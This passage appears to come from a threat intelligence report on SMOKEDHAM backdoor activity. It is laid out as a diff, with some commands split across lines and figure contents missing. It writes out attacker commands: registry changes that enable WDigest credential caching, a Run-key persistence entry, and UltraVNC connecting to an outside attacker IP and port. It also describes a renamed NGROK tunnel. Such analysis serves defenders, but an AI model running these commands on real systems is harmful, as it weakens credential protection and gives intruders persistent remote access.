@@ -1,0 +1,20 @@
+
+REG_DWORD /d 0 /f reg.exe ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa /v
+LimitBlankPasswordUse /t
+REG_DWORD /d
+1 /f
+Additionally, SMOKEDHAM modified the WDigest registry key value HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest\\UseLogonCredential to enable credential caching.
+Phase 6: Follow-on Activity SMOKEDHAM used PowerShell to connect to third-party file sharing sites to download the UltraVNC application renamed as winvnc.exe, and a configuration file named UltraVNC.ini, shown in Figure 8.
+These files were saved to the %APPDATA%\\Chrome\\ directory.
+The UltraVNC.ini file allowed UltraVNC to connect to port 6300 on the loopback address specified by the parameter
+AllowLoopback=1.
+Figure 8: Contents of UltraVNC.ini SMOKEDHAM was observed using UltraVNC to establish a connection to the IP address and port pair 81.91.177[.]54[:]7234 that has been observed in past UNC2465 intrusions.
+%APPDATA%\\Chrome\\winvnc.exe' -autoreconnect
+ID:15000151 -connect 81.91.177[.]54[:]7234 –run SMOKEDHAM created a persistence mechanism for UltraVNC by adding the application to the ConhostNT value under the current users Run registry key.
+reg.exe add HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v ConhostNT /d %appdata%\\Chrome\\winvnc.exe NGROK Configuration SMOKEDHAM used PowerShell to connect to third-party file sharing sites to download an NGROK utility that was renamed conhost.exe, and a script named VirtualHost.vbs that was used to execute NGROK with a configuration file named ngrok.yml.
+These files were stored in the C:\\ProgramData\\WindNT\\ directory.
+NGROK is a publicly available utility that can expose local servers behind NATs and firewalls to the public internet over secure tunnels.
+Figure 9 and Figure 10 show the contents of VirtualHost.vbs and ngrok.yml files, respectively.
+Figure 9:
+Contents of VirtualHost.vbs Figure 10: Contents of ngrok.yml
+The execution of VirtualHost.vbs allowed NGROK to listen and forward traffic on TCP port 6300 through an NGROK tunnel, subsequently allowing NGROK to tunnel UltraVNC traffic out of the environment.
